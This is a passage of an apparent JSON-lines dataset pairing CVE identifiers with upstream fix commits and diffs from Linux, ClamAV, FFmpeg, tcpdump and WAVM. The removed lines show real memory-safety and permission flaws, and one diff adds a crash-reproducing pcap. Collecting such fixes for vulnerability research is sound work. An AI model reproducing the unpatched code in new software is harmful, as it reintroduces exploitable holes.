24;\n+}\n+\n+static u32 gasp_version(__be32 *p)\n+{\n+\treturn be32_to_cpu(p[1]) & 0xffffff;\n+}\n+\n static void fwnet_receive_broadcast(struct fw_iso_context *context,\n \t\tu32 cycle, size_t header_length, void *header, void *data)\n {\n@@ -731,9 +758,6 @@ static void fwnet_receive_broadcast(struct fw_iso_context *context,\n \t__be32 *buf_ptr;\n \tint retval;\n \tu32 length;\n-\tu16 source_node_id;\n-\tu32 specifier_id;\n-\tu32 ver;\n \tunsigned long offset;\n \tunsigned long flags;\n \n@@ -750,22 +774,17 @@ static void fwnet_receive_broadcast(struct fw_iso_context *context,\n \n \tspin_unlock_irqrestore(&dev->lock, flags);\n \n-\tspecifier_id =    (be32_to_cpu(buf_ptr[0]) & 0xffff) << 8\n-\t\t\t| (be32_to_cpu(buf_ptr[1]) & 0xff000000) >> 24;\n-\tver = be32_to_cpu(buf_ptr[1]) & 0xffffff;\n-\tsource_node_id = be32_to_cpu(buf_ptr[0]) >> 16;\n-\n-\tif (specifier_id == IANA_SPECIFIER_ID &&\n-\t    (ver == RFC2734_SW_VERSION\n+\tif (length > IEEE1394_GASP_HDR_SIZE &&\n+\t    gasp_specifier_id(buf_ptr) == IANA_SPECIFIER_ID &&\n+\t    (gasp_version(buf_ptr) == RFC2734_SW_VERSION\n #if IS_ENABLED(CONFIG_IPV6)\n-\t     || ver == RFC3146_SW_VERSION\n+\t     || gasp_version(buf_ptr) == RFC3146_SW_VERSION\n #endif\n-\t    )) {\n-\t\tbuf_ptr += 2;\n-\t\tlength -= IEEE1394_GASP_HDR_SIZE;\n-\t\tfwnet_incoming_packet(dev, buf_ptr, length, source_node_id,\n+\t    ))\n+\t\tfwnet_incoming_packet(dev, buf_ptr + 2,\n+\t\t\t\t      length - IEEE1394_GASP_HDR_SIZE,\n+\t\t\t\t      gasp_source_id(buf_ptr),\n \t\t\t\t      context->card->generation, true);\n-\t}\n \n \tpacket.payload_length = dev->rcv_buffer_size;\n \tpacket.interrupt = 1;\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2017-6418", "CWE_ID": "125", "category": "security", "commit_id": "586a5180287262070637c8943f2f7efd652e4a2c", "commit_message": "From 586a5180287262070637c8943f2f7efd652e4a2c Mon Sep 17 00:00:00 2001\nFrom: Steven Morgan <stevmorg@cisco.com>\nDate: Thu, 2 Mar 2017 14:41:20 -0500\nSubject: [PATCH] bb11797 - fix invalid read in fuzzed mail file.\n\n---\n libclamav/message.c | 10 +++++++---\n 1 file changed, 7 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/libclamav/message.c b/libclamav/message.c\nindex b5cf0ddc72..36bbf417d9 100644\n--- a/libclamav/message.c\n+++ b/libclamav/message.c\n@@ -445,8 +445,12 @@ messageAddArgument(message *m, const char *arg)\n \t\t\t * FIXME: Bounce message handling is corrupting the in\n \t\t\t * core copies of headers\n \t\t\t */\n-\t\t\tcli_dbgmsg(\"Possible data corruption fixed\\n\");\n-\t\t\tp[8] = '=';\n+                        if (strlen(p) > 8) {\n+                            cli_dbgmsg(\"Possible data corruption fixed\\n\");\n+                            p[8] = '=';\n+                        } else {\n+                            cli_dbgmsg(\"Possible data corruption not fixed\\n\");\n+                        }\n \t\t} else {\n \t\t\tif(*p)\n \t\t\t\tcli_dbgmsg(\"messageAddArgument, '%s' contains no '='\\n\", p);\n@@ -682,7 +686,7 @@ messageFindArgument(const message *m, const char *variable)\n \t\t\t\tcli_dbgmsg(\"messageFindArgument: no '=' sign found in MIME header '%s' (%s)\\n\", variable, messageGetArgument(m, i));\n \t\t\t\treturn NULL;\n \t\t\t}\n-\t\t\tif((*++ptr == '\"') && (strchr(&ptr[1], '\"') != NULL)) {\n+\t\t\tif((strlen(ptr) > 2) && (*++ptr == '\"') && (strchr(&ptr[1], '\"') != NULL)) {\n \t\t\t\t/* Remove any quote characters */\n \t\t\t\tchar *ret = cli_strdup(++ptr);\n \t\t\t\tchar *p;\n", "owner": "Cisco-Talos", "repo": "clamav-devel", "source": "cve"}
{"CVE_ID": "CVE-2011-4127", "CWE_ID": "264", "category": "security", "commit_id": "0bfc96cb77224736dfa35c3c555d37b3646ef35e", "commit_message": "From 0bfc96cb77224736dfa35c3c555d37b3646ef35e Mon Sep 17 00:00:00 2001\nFrom: Paolo Bonzini <pbonzini@redhat.com>\nDate: Thu, 12 Jan 2012 16:01:28 +0100\nSubject: block: fail SCSI passthrough ioctls on partition devices\n\nLinux allows executing the SG_IO ioctl on a partition or LVM volume, and\nwill pass the command to the underlying block device.  This is\nwell-known, but it is also a large security problem when (via Unix\npermissions, ACLs, SELinux or a combination thereof) a program or user\nneeds to be granted access only to part of the disk.\n\nThis patch lets partitions forward a small set of harmless ioctls;\nothers are logged with printk so that we can see which ioctls are\nactually sent.  In my tests only CDROM_GET_CAPABILITY actually occurred.\nOf course it was being sent to a (partition on a) hard disk, so it would\nhave failed with ENOTTY and the patch isn't changing anything in\npractice.  Still, I'm treating it specially to avoid spamming the logs.\n\nIn principle, this restriction should include programs running with\nCAP_SYS_RAWIO.  If for example I let a program access /dev/sda2 and\n/dev/sdb, it still should not be able to read/write outside the\nboundaries of /dev/sda2 independent of the capabilities.  However, for\nnow programs with CAP_SYS_RAWIO will still be allowed to send the\nioctls.  Their actions will still be logged.\n\nThis patch does not affect the non-libata IDE driver.  That driver\nhowever already tests for bd != bd->bd_contains before issuing some\nioctl; it could be restricted further to forbid these ioctls even for\nprograms running with CAP_SYS_ADMIN/CAP_SYS_RAWIO.\n\nCc: linux-scsi@vger.kernel.org\nCc: Jens Axboe <axboe@kernel.dk>\nCc: James Bottomley <JBottomley@parallels.com>\nSigned-off-by: Paolo Bonzini <pbonzini@redhat.com>\n[ Make it also print the command name when warning - Linus ]\nSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>\n---\n block/scsi_ioctl.c     | 45 +++++++++++++++++++++++++++++++++++++++++++++\n drivers/scsi/sd.c      | 11 +++++++++--\n include/linux/blkdev.h |  1 +\n 3 files changed, 55 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/block/scsi_ioctl.c b/block/scsi_ioctl.c\nindex a2c11f330872..260fa80ef575 100644\n--- a/block/scsi_ioctl.c\n+++ b/block/scsi_ioctl.c\n@@ -24,6 +24,7 @@\n #include <linux/capability.h>\n #include <linux/completion.h>\n #include <linux/cdrom.h>\n+#include <linux/ratelimit.h>\n #include <linux/slab.h>\n #include <linux/times.h>\n #include <asm/uaccess.h>\n@@ -690,9 +691,53 @@ int scsi_cmd_ioctl(struct request_queue *q, struct gendisk *bd_disk, fmode_t mod\n }\n EXPORT_SYMBOL(scsi_cmd_ioctl);\n \n+int scsi_verify_blk_ioctl(struct block_device *bd, unsigned int cmd)\n+{\n+\tif (bd && bd == bd->bd_contains)\n+\t\treturn 0;\n+\n+\t/* Actually none of these is particularly useful on a partition,\n+\t * but they are safe.\n+\t */\n+\tswitch (cmd) {\n+\tcase SCSI_IOCTL_GET_IDLUN:\n+\tcase SCSI_IOCTL_GET_BUS_NUMBER:\n+\tcase SCSI_IOCTL_GET_PCI:\n+\tcase SCSI_IOCTL_PROBE_HOST:\n+\tcase SG_GET_VERSION_NUM:\n+\tcase SG_SET_TIMEOUT:\n+\tcase SG_GET_TIMEOUT:\n+\tcase SG_GET_RESERVED_SIZE:\n+\tcase SG_SET_RESERVED_SIZE:\n+\tcase SG_EMULATED_HOST:\n+\t\treturn 0;\n+\tcase CDROM_GET_CAPABILITY:\n+\t\t/* Keep this until we remove the printk below.  udev sends it\n+\t\t * and we do not want to spam dmesg about it.   CD-ROMs do\n+\t\t * not have partitions, so we get here only for disks.\n+\t\t */\n+\t\treturn -ENOIOCTLCMD;\n+\tdefault:\n+\t\tbreak;\n+\t}\n+\n+\t/* In particular, rule out all resets and host-specific ioctls.  */\n+\tprintk_ratelimited(KERN_WARNING\n+\t\t\t   \"%s: sending ioctl %x to a partition!\\n\", current->comm, cmd);\n+\n+\treturn capable(CAP_SYS_RAWIO) ? 0 : -ENOIOCTLCMD;\n+}\n+EXPORT_SYMBOL(scsi_verify_blk_ioctl);\n+\n int scsi_cmd_blk_ioctl(struct block_device *bd, fmode_t mode,\n \t\t       unsigned int cmd, void __user *arg)\n {\n+\tint ret;\n+\n+\tret = scsi_verify_blk_ioctl(bd, cmd);\n+\tif (ret < 0)\n+\t\treturn ret;\n+\n \treturn scsi_cmd_ioctl(bd->bd_disk->queue, bd->bd_disk, mode, cmd, arg);\n }\n EXPORT_SYMBOL(scsi_cmd_blk_ioctl);\ndiff --git a/drivers/scsi/sd.c b/drivers/scsi/sd.c\nindex b4d57bb04c72..c691fb50e6cb 100644\n--- a/drivers/scsi/sd.c\n+++ b/drivers/scsi/sd.c\n@@ -1075,6 +1075,10 @@ static int sd_ioctl(struct block_device *bdev, fmode_t mode,\n \tSCSI_LOG_IOCTL(1, sd_printk(KERN_INFO, sdkp, \"sd_ioctl: disk=%s, \"\n \t\t\t\t    \"cmd=0x%x\\n\", disk->disk_name, cmd));\n \n+\terror = scsi_verify_blk_ioctl(bdev, cmd);\n+\tif (error < 0)\n+\t\treturn error;\n+\n \t/*\n \t * If we are in the middle of error recovery, don't let anyone\n \t * else try and use this device.  Also, if error recovery fails, it\n@@ -1267,6 +1271,11 @@ static int sd_compat_ioctl(struct block_device *bdev, fmode_t mode,\n \t\t\t   unsigned int cmd, unsigned long arg)\n {\n \tstruct scsi_device *sdev = scsi_disk(bdev->bd_disk)->device;\n+\tint ret;\n+\n+\tret = scsi_verify_blk_ioctl(bdev, cmd);\n+\tif (ret < 0)\n+\t\treturn ret;\n \n \t/*\n \t * If we are in the middle of error recovery, don't let anyone\n@@ -1278,8 +1287,6 @@ static int sd_compat_ioctl(struct block_device *bdev, fmode_t mode,\n \t\treturn -ENODEV;\n \t       \n \tif (sdev->host->hostt->compat_ioctl) {\n-\t\tint ret;\n-\n \t\tret = sdev->host->hostt->compat_ioctl(sdev, cmd, (void __user *)arg);\n \n \t\treturn ret;\ndiff --git a/include/linux/blkdev.h b/include/linux/blkdev.h\nindex ca7b869508c7..0ed1eb062313 100644\n--- a/include/linux/blkdev.h\n+++ b/include/linux/blkdev.h\n@@ -675,6 +675,7 @@ extern int blk_insert_cloned_request(struct request_queue *q,\n \t\t\t\t     struct request *rq);\n extern void blk_delay_queue(struct request_queue *, unsigned long);\n extern void blk_recount_segments(struct request_queue *, struct bio *);\n+extern int scsi_verify_blk_ioctl(struct block_device *, unsigned int);\n extern int scsi_cmd_blk_ioctl(struct block_device *, fmode_t,\n \t\t\t      unsigned int, void __user *);\n extern int scsi_cmd_ioctl(struct request_queue *, struct gendisk *, fmode_t,\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2014-7145", "CWE_ID": "399", "category": "security", "commit_id": "18f39e7be0121317550d03e267e3ebd4dbfbb3ce", "commit_message": "From 18f39e7be0121317550d03e267e3ebd4dbfbb3ce Mon Sep 17 00:00:00 2001\nFrom: Steve French <smfrench@gmail.com>\nDate: Sun, 17 Aug 2014 00:22:24 -0500\nSubject: [CIFS] Possible null ptr deref in SMB2_tcon\n\nAs Raphael Geissert pointed out, tcon_error_exit can dereference tcon\nand there is one path in which tcon can be null.\n\nSigned-off-by: Steve French <smfrench@gmail.com>\nCC: Stable <stable@vger.kernel.org> # v3.7+\nReported-by: Raphael Geissert <geissert@debian.org>\n---\n fs/cifs/smb2pdu.c | 3 ++-\n 1 file changed, 2 insertions(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/fs/cifs/smb2pdu.c b/fs/cifs/smb2pdu.c\nindex 74440af59f35..240c627bc0c6 100644\n--- a/fs/cifs/smb2pdu.c\n+++ b/fs/cifs/smb2pdu.c\n@@ -907,7 +907,8 @@ tcon_exit:\n tcon_error_exit:\n \tif (rsp->hdr.Status == STATUS_BAD_NETWORK_NAME) {\n \t\tcifs_dbg(VFS, \"BAD_NETWORK_NAME: %s\\n\", tree);\n-\t\ttcon->bad_network_name = true;\n+\t\tif (tcon)\n+\t\t\ttcon->bad_network_name = true;\n \t}\n \tgoto tcon_exit;\n }\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2014-1446", "CWE_ID": "399", "category": "security", "commit_id": "8e3fbf870481eb53b2d3a322d1fc395ad8b367ed", "commit_message": "From 8e3fbf870481eb53b2d3a322d1fc395ad8b367ed Mon Sep 17 00:00:00 2001\nFrom: =?UTF-8?q?Salva=20Peir=C3=B3?= <speiro@ai2.upv.es>\nDate: Tue, 17 Dec 2013 10:06:30 +0100\nSubject: [PATCH] hamradio/yam: fix info leak in ioctl\nMIME-Version: 1.0\nContent-Type: text/plain; charset=UTF-8\nContent-Transfer-Encoding: 8bit\n\nThe yam_ioctl() code fails to initialise the cmd field\nof the struct yamdrv_ioctl_cfg. Add an explicit memset(0)\nbefore filling the structure to avoid the 4-byte info leak.\n\nSigned-off-by: Salva Peiró <speiro@ai2.upv.es>\nSigned-off-by: David S. Miller <davem@davemloft.net>\n---\n drivers/net/hamradio/yam.c | 1 +\n 1 file changed, 1 insertion(+)\n\n", "diff_code": "diff --git a/drivers/net/hamradio/yam.c b/drivers/net/hamradio/yam.c\nindex 1971411574db1..61dd2447e1bb4 100644\n--- a/drivers/net/hamradio/yam.c\n+++ b/drivers/net/hamradio/yam.c\n@@ -1057,6 +1057,7 @@ static int yam_ioctl(struct net_device *dev, struct ifreq *ifr, int cmd)\n \t\tbreak;\n \n \tcase SIOCYAMGCFG:\n+\t\tmemset(&yi, 0, sizeof(yi));\n \t\tyi.cfg.mask = 0xffffffff;\n \t\tyi.cfg.iobase = yp->iobase;\n \t\tyi.cfg.irq = yp->irq;\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2013-1943", "CWE_ID": "20", "category": "security", "commit_id": "fa3d315a4ce2c0891cdde262562e710d95fba19e", "commit_message": "From fa3d315a4ce2c0891cdde262562e710d95fba19e Mon Sep 17 00:00:00 2001\nFrom: Takuya Yoshikawa <yoshikawa.takuya@oss.ntt.co.jp>\nDate: Sat, 7 May 2011 16:35:38 +0900\nSubject: KVM: Validate userspace_addr of memslot when registered\n\nThis way, we can avoid checking the user space address many times when\nwe read the guest memory.\n\nAlthough we can do the same for write if we check which slots are\nwritable, we do not care write now: reading the guest memory happens\nmore often than writing.\n\n[avi: change VERIFY_READ to VERIFY_WRITE]\n\nSigned-off-by: Takuya Yoshikawa <yoshikawa.takuya@oss.ntt.co.jp>\nSigned-off-by: Avi Kivity <avi@redhat.com>\n---\n arch/x86/kvm/paging_tmpl.h | 2 +-\n virt/kvm/kvm_main.c        | 7 +++++--\n 2 files changed, 6 insertions(+), 3 deletions(-)\n\n", "diff_code": "diff --git a/arch/x86/kvm/paging_tmpl.h b/arch/x86/kvm/paging_tmpl.h\nindex 88ca456ccd68..e3f81418797e 100644\n--- a/arch/x86/kvm/paging_tmpl.h\n+++ b/arch/x86/kvm/paging_tmpl.h\n@@ -185,7 +185,7 @@ walk:\n \t\t}\n \n \t\tptep_user = (pt_element_t __user *)((void *)host_addr + offset);\n-\t\tif (unlikely(copy_from_user(&pte, ptep_user, sizeof(pte)))) {\n+\t\tif (unlikely(__copy_from_user(&pte, ptep_user, sizeof(pte)))) {\n \t\t\tpresent = false;\n \t\t\tbreak;\n \t\t}\ndiff --git a/virt/kvm/kvm_main.c b/virt/kvm/kvm_main.c\nindex 58146457bf97..ed3c4e7c1008 100644\n--- a/virt/kvm/kvm_main.c\n+++ b/virt/kvm/kvm_main.c\n@@ -648,7 +648,10 @@ int __kvm_set_memory_region(struct kvm *kvm,\n \t\tgoto out;\n \tif (mem->guest_phys_addr & (PAGE_SIZE - 1))\n \t\tgoto out;\n-\tif (user_alloc && (mem->userspace_addr & (PAGE_SIZE - 1)))\n+\t/* We can read the guest memory with __xxx_user() later on. */\n+\tif (user_alloc &&\n+\t    ((mem->userspace_addr & (PAGE_SIZE - 1)) ||\n+\t     !access_ok(VERIFY_WRITE, mem->userspace_addr, mem->memory_size)))\n \t\tgoto out;\n \tif (mem->slot >= KVM_MEMORY_SLOTS + KVM_PRIVATE_MEM_SLOTS)\n \t\tgoto out;\n@@ -1283,7 +1286,7 @@ int kvm_read_guest_page(struct kvm *kvm, gfn_t gfn, void *data, int offset,\n \taddr = gfn_to_hva(kvm, gfn);\n \tif (kvm_is_error_hva(addr))\n \t\treturn -EFAULT;\n-\tr = copy_from_user(data, (void __user *)addr + offset, len);\n+\tr = __copy_from_user(data, (void __user *)addr + offset, len);\n \tif (r)\n \t\treturn -EFAULT;\n \treturn 0;\n-- \ncgit 1.2-0.3.lf.el7\n\n", "owner": "torvalds", "repo": "linux", "source": "cve"}
{"CVE_ID": "CVE-2018-17292", "CWE_ID": "125", "category": "security", "commit_id": "2de6cf70c5ef31e22ed119a25ac2daeefd3d18a1", "commit_message": "From 2de6cf70c5ef31e22ed119a25ac2daeefd3d18a1 Mon Sep 17 00:00:00 2001\nFrom: Andrew Scheidecker <andrew@scheidecker.net>\nDate: Sun, 16 Sep 2018 08:20:54 -0400\nSubject: [PATCH] Fix out-of-bounds array access when passing a <4 byte input\n file to wavm or wavm-compile\n\n---\n Include/Inline/CLI.h | 2 +-\n 1 file changed, 1 insertion(+), 1 deletion(-)\n\n", "diff_code": "diff --git a/Include/Inline/CLI.h b/Include/Inline/CLI.h\nindex 2cd490c0..05d0c614 100644\n--- a/Include/Inline/CLI.h\n+++ b/Include/Inline/CLI.h\n@@ -144,7 +144,7 @@ inline bool loadModule(const char* filename, IR::Module& outModule)\n \tif(!loadFile(filename, fileBytes)) { return false; }\n \n \t// If the file starts with the WASM binary magic number, load it as a binary irModule.\n-\tif(*(U32*)fileBytes.data() == 0x6d736100)\n+\tif(fileBytes.size() >= 4 && *(U32*)fileBytes.data() == 0x6d736100)\n \t{ return loadBinaryModule(fileBytes.data(), fileBytes.size(), outModule); }\n \telse\n \t{\n", "owner": "WAVM", "repo": "WAVM", "source": "cve"}
{"CVE_ID": "CVE-2017-17081", "CWE_ID": "125", "category": "security", "commit_id": "58cf31cee7a456057f337b3102a03206d833d5e8", "commit_message": "From 58cf31cee7a456057f337b3102a03206d833d5e8 Mon Sep 17 00:00:00 2001\nFrom: Michael Niedermayer <michael@niedermayer.cc>\nDate: Mon, 13 Nov 2017 20:47:48 +0100\nSubject: [PATCH] avcodec/x86/mpegvideodsp: Fix signedness bug in need_emu\n\nFixes: out of array read\nFixes: 3516/attachment-311488.dat\n\nFound-by: Insu Yun, Georgia Tech.\nTested-by: wuninsu@gmail.com\nSigned-off-by: Michael Niedermayer <michael@niedermayer.cc>\n---\n libavcodec/x86/mpegvideodsp.c | 5 +++--\n 1 file changed, 3 insertions(+), 2 deletions(-)\n\n", "diff_code": "diff --git a/libavcodec/x86/mpegvideodsp.c b/libavcodec/x86/mpegvideodsp.c\nindex e0498f38496..6009b64e076 100644\n--- a/libavcodec/x86/mpegvideodsp.c\n+++ b/libavcodec/x86/mpegvideodsp.c\n@@ -52,8 +52,9 @@ static void gmc_mmx(uint8_t *dst, uint8_t *src,\n     const int dyh = (dyy - (1 << (16 + shift))) * (h - 1);\n     const int dxh = dxy * (h - 1);\n     const int dyw = dyx * (w - 1);\n-    int need_emu  =  (unsigned) ix >= width  - w ||\n-                     (unsigned) iy >= height - h;\n+    int need_emu  =  (unsigned) ix >= width  - w || width < w ||\n+                     (unsigned) iy >= height - h || height< h\n+                     ;\n \n     if ( // non-constant fullpel offset (3% of blocks)\n         ((ox ^ (ox + dxw)) | (ox ^ (ox + dxh)) | (ox ^ (ox + dxw + dxh)) |\n", "owner": "FFmpeg", "repo": "FFmpeg", "source": "cve"}
{"CVE_ID": "CVE-2017-13047", "CWE_ID": "119", "category": "security", "commit_id": "331530a4076c69bbd2e3214db6ccbe834fb75640", "commit_message": "From 331530a4076c69bbd2e3214db6ccbe834fb75640 Mon Sep 17 00:00:00 2001\nFrom: Denis Ovsienko <denis@ovsienko.info>\nDate: Sun, 6 Aug 2017 20:54:42 +0100\nSubject: [PATCH] CVE-2017-13047/ES-IS: put an existing bounds check right\n\nThe bounds check in esis_print() tested one pointer at the beginning of\na loop that incremented another, make the trivial fix. While at it, make\nthe function print a standard marker when it detects truncated data and\nupdate some existing ES-IS tests respectively.\n\nThis fixes a buffer over-read discovered by Bhargava Shastry,\nSecT/TU Berlin.\n\nAdd a test using the capture file supplied by the reporter(s).\n---\n print-isoclns.c               |   4 ++--\n tests/TESTLIST                |   1 +\n tests/esis_opt_prot-oobr.out  |   5 +++++\n tests/esis_opt_prot-oobr.pcap | Bin 0 -> 76 bytes\n tests/esis_snpa_asan-3.out    |   2 +-\n tests/esis_snpa_asan-4.out    |   4 ++--\n tests/esis_snpa_asan-5.out    |   2 +-\n 7 files changed, 12 insertions(+), 6 deletions(-)\n create mode 100644 tests/esis_opt_prot-oobr.out\n create mode 100644 tests/esis_opt_prot-oobr.pcap\n\n", "diff_code": "diff --git a/print-isoclns.c b/print-isoclns.c\nindex 628550284..06ad90641 100644\n--- a/print-isoclns.c\n+++ b/print-isoclns.c\n@@ -1334,7 +1334,7 @@ esis_print(netdissect_options *ndo,\n \n             case ESIS_OPTION_PROTOCOLS:\n                 while (opli>0) {\n-                    ND_TCHECK(*pptr);\n+                    ND_TCHECK(*tptr);\n                     ND_PRINT((ndo, \"%s (0x%02x)\",\n                            tok2str(nlpid_values,\n                                    \"unknown\",\n@@ -1367,7 +1367,7 @@ esis_print(netdissect_options *ndo,\n             pptr += opli;\n         }\n trunc:\n-\treturn;\n+        ND_PRINT((ndo, \"[|esis]\"));\n }\n \n static void\ndiff --git a/tests/TESTLIST b/tests/TESTLIST\nindex d80395177..62e705bf3 100644\n--- a/tests/TESTLIST\n+++ b/tests/TESTLIST\n@@ -566,6 +566,7 @@ vqp-oobr\t\tvqp-oobr.pcap\t\t\tvqp-oobr.out\t\t-v -c1\n bgp_pmsi_tunnel-oobr\tbgp_pmsi_tunnel-oobr.pcap\tbgp_pmsi_tunnel-oobr.out -v -c1\n bgp_mvpn_6_and_7\tbgp_mvpn_6_and_7.pcap\t\tbgp_mvpn_6_and_7.out\t-v -c1\n rsvp_fast_reroute-oobr\trsvp_fast_reroute-oobr.pcap\trsvp_fast_reroute-oobr.out -v -c1\n+esis_opt_prot-oobr\tesis_opt_prot-oobr.pcap\t\tesis_opt_prot-oobr.out\t-v -c1\n \n # bad packets from Katie Holly\n mlppp-oobr\t\tmlppp-oobr.pcap\t\t\tmlppp-oobr.out\ndiff --git a/tests/esis_opt_prot-oobr.out b/tests/esis_opt_prot-oobr.out\nnew file mode 100644\nindex 000000000..359eb0fa7\n--- /dev/null\n+++ b/tests/esis_opt_prot-oobr.out\n@@ -0,0 +1,5 @@\n+ES-IS, length 33559803\n+\tredirect (6), v: 1, checksum: 0x00c6 (unverified), holding time: 2303s, length indicator: 54\n+\t  00.8e\n+\t  SNPA (length: 0): <empty>\n+\t  Protocols supported Option #129, length 11, value: CLNP (0x81), [|esis]\ndiff --git a/tests/esis_opt_prot-oobr.pcap b/tests/esis_opt_prot-oobr.pcap\nnew file mode 100644\nindex 0000000000000000000000000000000000000000..c50cb67eca7abd05558225bc5bebfe647b760fae\nGIT binary patch\nliteral 76\nzcmca|c+)~A1{MY&;1l@I&>#k6WB{?lwurnZaxx4`AQ@2xCZ;?8{_!`NF*2la{AW1E\nY#L&mU(8%4$$iT?lz`($v3R1-Y0K?-DLjV8(\n\nliteral 0\nHcmV?d00001\n\ndiff --git a/tests/esis_snpa_asan-3.out b/tests/esis_snpa_asan-3.out\nindex 5e6a14d1d..109d25919 100644\n--- a/tests/esis_snpa_asan-3.out\n+++ b/tests/esis_snpa_asan-3.out\n@@ -4,4 +4,4 @@ UI 22! ES-IS, length 65565\n UI 22! ES-IS, length 2650865693\n \tredirect (6), v: 1, checksum: 0x0300 (incorrect should be 0xbce5), holding time: 21480s, length indicator: 17\n \t  ec.ff00.00\n-\t  SNPA (length: 0): <empty>\n+\t  SNPA (length: 0): <empty>[|esis]\ndiff --git a/tests/esis_snpa_asan-4.out b/tests/esis_snpa_asan-4.out\nindex 249b248bf..10a52d46f 100644\n--- a/tests/esis_snpa_asan-4.out\n+++ b/tests/esis_snpa_asan-4.out\n@@ -7,7 +7,7 @@ UI 22! ES-IS, length 65565\n \tredirect (6), v: 1, checksum: 0x7034 (incorrect should be 0x44ec), holding time: 21315s, length indicator: 16\n \t  02.0400\n \t  SNPA (length: 0): <empty>\n-\t  Unknown Option #0, length 0, value: \n+\t  Unknown Option #0, length 0, value: [|esis]\n UI 32! ES-IS, length 65565\n \tESH (2), v: 1, checksum: 0x70a1 (incorrect should be 0xfb4e), holding time: 21315s, length indicator: 17\n \t  Number of Source Addresses: 2\n@@ -17,5 +17,5 @@ UI 22! ES-IS, length 4244701213\n \tredirect (6), v: 1, checksum: 0x7034 (incorrect should be 0x36fe), holding time: 21315s, length indicator: 17\n \t  isonsap_string: illegal length\n \t  SNPA (length: 0): <empty>\n-\t  NET (length: 4) 00.0000.00\n+\t  NET (length: 4) 00.0000.00[|esis]\n Q.922, invalid address\ndiff --git a/tests/esis_snpa_asan-5.out b/tests/esis_snpa_asan-5.out\nindex bd8c30dd2..527214cb3 100644\n--- a/tests/esis_snpa_asan-5.out\n+++ b/tests/esis_snpa_asan-5.out\n@@ -3,7 +3,7 @@ UI 22! ES-IS, length 65565\n \t  Number of Source Addresses: 3\n \t  NET (length: 0): isonsap_string: illegal length\n \t  NET (length: 4): ec.ff00.00\n-\t  NET (length: 0): isonsap_string: illegal length\n+\t  NET (length: 0): isonsap_string: illegal length[|esis]\n UI 22! ES-IS, length 65565\n \tredirect (6), v: 1, checksum: 0x7034 (incorrect should be 0x3ff0), holding time: 21315s, length indicator: 17\n \t  04\n", "owner": "the-tcpdump-group", "repo": "tcpdump", "source": "cve"}
{"CVE_ID": "CVE-2011-1019", "CWE_ID": "264", "category": "security", "commit_id": "8909c9ad8ff03611c9c96c9a92656213e4bb495b", "commit_message": "From 8909c9ad8ff03611c9c96c9a92656213e4bb495b Mon Sep 17 00:00:00 2001\nFrom: Vasiliy Kulikov <segoon@openwall.com>\nDate: Wed, 2 Mar 2011 00:33:13 +0300\nSubject: [PATCH] net: don't allow CAP_NET_ADMIN to load non-netdev kernel\n modules\n\nSince a8f80e8ff94ecba629542d9b4b5f5a8ee3eb565c any process with\nCAP_NET_ADMIN may load any module from /lib/modules/.  This doesn't mean\nthat CAP_NET_ADMIN is a superset of CAP_SYS_MODULE as modules are\nlimited to /lib/modules/**.  However, CAP_NET_ADMIN capability shouldn't\nallow anybody load any module not related to networking.\n\nThis patch restricts an ability of autoloading modules to netdev modules\nwith explicit aliases.  This fixes CVE-2011-1019.\n\nArnd Bergmann suggested to leave untouched the old pre-v2.6.32 behavior\nof loading netdev modules by name (without any prefix) for processes\nwith CAP_SYS_MODULE to maintain the compatibility with network scripts\nthat use autoloading netdev modules by aliases like \"eth0\", \"wlan0\".\n\nCurrently there are only three users of the feature in the upstream\nkernel: ipip, ip_gre and sit.\n\n    root@albatros:~# capsh --drop=$(seq -s, 0 11),$(seq -s, 13 34) --\n    root@albatros:~# grep Cap /proc/$$/status\n    CapInh:\t0000000000000000\n    CapPrm:\tfffffff800001000\n    CapEff:\tfffffff800001000\n    CapBnd:\tfffffff800001000\n    root@albatros:~# modprobe xfs\n    FATAL: Error inserting xfs\n    (/lib/modules/2.6.38-rc6-00001-g2bf4ca3/kernel/fs/xfs/xfs.ko): Operation not permitted\n    root@albatros:~# lsmod | grep xfs\n    root@albatros:~# ifconfig xfs\n    xfs: error fetching interface information: Device not found\n    root@albatros:~# lsmod | grep xfs\n    root@albatros:~# lsmod | grep sit\n    root@albatros:~# ifconfig sit\n    sit: error fetching interface information: Device not found\n    root@albatros:~# lsmod | grep sit\n    root@albatros:~# ifconfig sit0\n    sit0      Link encap:IPv6-in-IPv4\n\t      NOARP  MTU:1480  Metric:1\n\n    root@albatros:~# lsmod | grep sit\n    sit                    10457  0\n    tunnel4                 2957  1 sit\n\nFor CAP_SYS_MODULE module loading is still relaxed:\n\n    root@albatros:~# grep Cap /proc/$$/status\n    CapInh:\t0000000000000000\n    CapPrm:\tffffffffffffffff\n    CapEff:\tffffffffffffffff\n    CapBnd:\tffffffffffffffff\n    root@albatros:~# ifconfig xfs\n    xfs: error fetching interface information: Device not found\n    root@albatros:~# lsmod | grep xfs\n    xfs                   745319  0\n\nReference: https://lkml.org/lkml/2011/2/24/203\n\nSigned-off-by: Vasiliy Kulikov <segoon@openwall.com>\nSigned-off-by: Michael Tokarev <mjt@tls.msk.ru>\nAcked-by: David S. Miller <davem@davemloft.net>\nAcked-by: Kees Cook <kees.cook@canonical.com>\nSigned-off-by: James Morris <jmorris@namei.org>\n---\n include/linux/netdevice.h |  3 +++\n net/core/dev.c            | 12 ++++++++++--\n net/ipv4/ip_gre.c         |  2 +-\n net/ipv4/ipip.c           |  2 +-\n net/ipv6/sit.c            |  2 +-\n 5 files changed, 16 insertions(+), 5 deletions(-)\n\n", "diff_code": "diff --git a/include/linux/netdevice.h b/include/linux/netdevice.h\nindex d971346b0340d..71caf7a5e6c6c 100644\n--- a/include/linux/netdevice.h\n+++ b/include/linux/netdevice.h\n@@ -2392,6 +2392,9 @@ extern int netdev_notice(const struct net_device *dev, const char *format, ...)\n extern int netdev_info(const struct net_device *dev, const char *format, ...)\n \t__attribute__ ((format (printf, 2, 3)));\n \n+#define MODULE_ALIAS_NETDEV(device) 